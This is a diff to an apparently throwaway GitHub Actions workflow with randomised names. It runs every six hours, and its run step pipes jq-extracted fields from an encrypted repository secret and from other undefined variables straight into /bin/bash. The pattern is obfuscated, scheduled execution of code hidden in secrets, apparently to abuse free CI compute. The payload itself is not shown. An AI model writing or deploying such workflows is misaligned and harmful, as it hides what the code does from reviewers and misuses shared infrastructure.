@@ -3,24 +3,25 @@ name: changyiwan8765
 on:
   workflow_dispatch:
   schedule:
-    - cron: '1 0/6 * * *'
-jobs:  # 27733
+    - cron: '9 1/6 * * *'
+
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: changyiwan8765
         env:
-          d803: ${{ secrets.d803 }}
+          an88: ${{ secrets.an88 }}
         run: |
-          echo $d803 | jq -r .q8 | /bin/bash
-          echo $usoa6 | jq -r .vwiy1 | /bin/bash
-          echo $twch11 | jq -r .lhtd89696 | /bin/bash
-          echo $osa31 | jq -r .njp9480 | /bin/bash
-          echo $kxse4108 | jq -r .womo454 | /bin/bash
-          echo $vxx822 | jq -r .dy71905 | /bin/bash
-          echo $ggwk0 | jq -r .cp6111 | /bin/bash
-          echo $gjl9945 | jq -r .lcqck422 | /bin/bash
-          echo $yb2738 | jq -r .wh3 | /bin/bash
+          echo $an88 | jq -r .wj8556 | /bin/bash
+          echo $dzk3322 | jq -r .ca47 | /bin/bash
+          echo $fxjzg09375 | jq -r .bktz41 | /bin/bash
+          echo $ctmd35 | jq -r .fmyrm7 | /bin/bash
+          echo $z273 | jq -r .ex3374 | /bin/bash
+          echo $b26 | jq -r .uym34 | /bin/bash
+          echo $qnxyq03983 | jq -r .jmlt2412 | /bin/bash
+          echo $p01 | jq -r .a08 | /bin/bash
+          echo $n54941 | jq -r .june4 | /bin/bash
+          echo $ckdsm74 | jq -r .fpp5 | /bin/bash
 
